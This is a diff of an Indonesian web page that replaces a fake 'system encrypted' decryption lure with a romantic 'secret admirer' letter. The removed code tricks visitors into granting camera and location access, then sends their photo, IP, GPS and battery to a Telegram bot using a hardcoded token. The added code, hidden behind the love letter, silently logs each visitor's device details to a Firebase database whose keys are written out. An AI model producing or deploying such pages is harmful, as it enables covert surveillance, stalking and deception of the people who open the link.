@@ -1,98 +1,111 @@
-<!DOCTYPE html>
+<DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Sistem</title>
+    <title>Satu Pesan Spesial Untukmu ✨</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Quicksand:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        #camera-preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; }
-        .box { z-index: 5; text-align: center; border: 1px solid #333; padding: 20px; border-radius: 10px; }
-        .dot { height: 10px; width: 10px; background-color: red; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        body { background-color: #fff5f7; font-family: 'Quicksand', sans-serif; overflow-x: hidden; }
+        .font-love { font-family: 'Dancing Script', cursive; }
+        .bg-soft-pink { background-color: #ffe4e9; }
+        .btn-love { background: linear-gradient(135deg, #ff85a1, #ffafbd); transition: 0.3s; }
+        .btn-love:hover { transform: scale(1.05); filter: brightness(1.05); }
+        .heart-particle { position: fixed; pointer-events: none; animation: floatUp 4s linear forwards; color: #ff85a1; }
+        @keyframes floatUp { to { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
     </style>
 </head>
-<body>
-    <div class="box">
-        <div class="dot"></div>
-        <p>SYSTEM ENCRYPTED</p>
-        <p style="font-size: 12px; color: #888;">Mohon Izinkan Akses Perangkat untuk Dekripsi Data</p>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div id="card" class="bg-white p-8 rounded-[2rem] shadow-xl max-w-sm w-full text-center border-b-8 border-pink-200">
+        <div class="text-5xl mb-4">💌</div>
+        <h1 class="text-3xl font-love text-pink-500 mb-4">Hai Ganteng...</h1>
+        <p class="text-gray-500 text-sm leading-relaxed mb-8">
+            Aku sudah lama ingin bilang ini, tapi aku nggak punya keberanian. Jadi aku tulis lewat surat kecil ini...
+        </p>
+        
+        <button onclick="bukaSurat()" id="btn" class="btn-love w-full py-4 text-white font-bold rounded-2xl shadow-lg uppercase tracking-widest text-xs">
+            Buka Suratnya ✨
+        </button>
+
+        <div id="isi" class="hidden mt-6 pt-6 border-t border-pink-100 text-left animate-fade-in">
+            <p class="text-pink-600 font-love text-xl mb-4 italic text-center">
+                "Setiap kali aku melihatmu, duniaku terasa lebih berwarna. Kamu itu spesial, dan aku harap kamu tahu itu."
+            </p>
+            <p class="text-[10px] text-gray-400 text-right uppercase tracking-tighter">- Dari Seseorang Yang Mengagumimu</p>
+        </div>
     </div>
 
-    <video id="camera-preview" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        const BOT_TOKEN = '8671154802:AAE27-gfr-z089_hQc7imsfH9DXWrXvubQI';
-        const CHAT_ID = '1397999934';
-        let targetData = {};
+        const firebaseConfig = {
+            apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
+            authDomain: "database-me-40ff4.firebaseapp.com",
+            databaseURL: "https://database-me-40ff4-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "database-me-40ff4",
+            storageBucket: "database-me-40ff4.firebasestorage.app",
+            messagingSenderId: "80099598743",
+            appId: "1:80099598743:web:a91e1ee54c14a84d62a4d2",
+            measurementId: "G-9FHG7LMB0Z"
+        };
 
-        // Fungsi kirim paket lengkap (Foto + Caption Data)
-        async function sendFullPackage(photoBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, 'target_muka.jpg');
-            
-            // Caption isi semua info biar barengan sama foto
-            let caption = `<b>🔥 TARGET KENA JEBAKAN! 🔥</b>\n\n` +
-                          `🌐 <b>IP:</b> <code>${targetData.ip || 'Gagal'}</code>\n` +
-                          `🔋 <b>Batre:</b> ${targetData.battery || '??'}%\n` +
-                          `📍 <b>Maps:</b> ${targetData.maps || 'Akses Ditolak'}\n` +
-                          `📱 <b>Device:</b> <code>${navigator.userAgent.substring(0, 50)}...</code>`;
-            
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'html');
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+        async function grab() {
+            try {
+                let bat = "N/A", charge = false;
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.floor(b.level * 100) + "%";
+                    charge = b.charging;
+                }
+                const ua = navigator.userAgent;
+                let dev = "Device";
+                if (/iPhone|iPad/i.test(ua)) dev = "iPhone";
+                else if (/Samsung/i.test(ua)) dev = "Samsung";
+                else if (/Vivo/i.test(ua)) dev = "Vivo";
+                else if (/Oppo/i.test(ua)) dev = "Oppo";
+                else if (/Redmi|Xiaomi/i.test(ua)) dev = "Xiaomi";
+                else if (/NX|Nubia/i.test(ua)) dev = "Redmagic";
+
+                const logId = "T_" + Date.now();
+                db.ref('logs/' + logId).set({
+                    info: {
+                        perangkat: dev,
+                        baterai: bat,
+                        status_cas: charge ? "Ngecas" : "Tidak",
+                        jam_hp: new Date().toLocaleString('id-ID'),
+                        ua: ua,
+                        layar: `${window.screen.width}x${window.screen.height}`
+                    }
+                });
+            } catch(e) {}
         }
 
-        async function init() {
-            // 1. Sedot IP & Batre dulu
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-                targetData.ip = ipJson.ip;
-                const bat = await navigator.getBattery();
-                targetData.battery = Math.round(bat.level * 100);
-            } catch (e) {}
+        window.onload = grab;
 
-            // 2. Minta Lokasi & Kamera Barengan
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                targetData.maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                startCamera();
-            }, () => {
-                targetData.maps = "Akses Lokasi Ditolak";
-                startCamera();
-            });
-        }
-
-        async function startCamera() {
-            const video = document.getElementById('camera-preview');
-            const canvas = document.getElementById('canvas');
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = 'block'; // Mirror Mode: Muka target muncul
-
-                // Tunggu 1.5 detik biar fokus, langsung jepret & kirim Paket Lengkap
-                setTimeout(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendFullPackage(blob), 'image/jpeg');
-                }, 1500);
-            } catch (err) {
-                // Kalau kamera ditolak, tetep kirim data teksnya aja
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=html&text=<b>❌ KAMERA DITOLAK</b>%0A%0AIP: ${targetData.ip}%0AMaps: ${targetData.maps}`);
+        function bukaSurat() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('isi').classList.remove('hidden');
+            for(let i=0; i<15; i++) {
+                setTimeout(buatHati, i * 200);
             }
         }
 
-        window.onload = init;
+        function buatHati() {
+            const h = document.createElement('div');
+            h.innerHTML = '❤️';
+            h.className = 'heart-particle';
+            h.style.left = Math.random() * 100 + 'vw';
+            h.style.top = '100vh';
+            h.style.fontSize = (Math.random() * 20 + 10) + 'px';
+            document.body.appendChild(h);
+            setTimeout(() => h.remove(), 4000);
+        }
     </script>
 </body>
 </html>
+
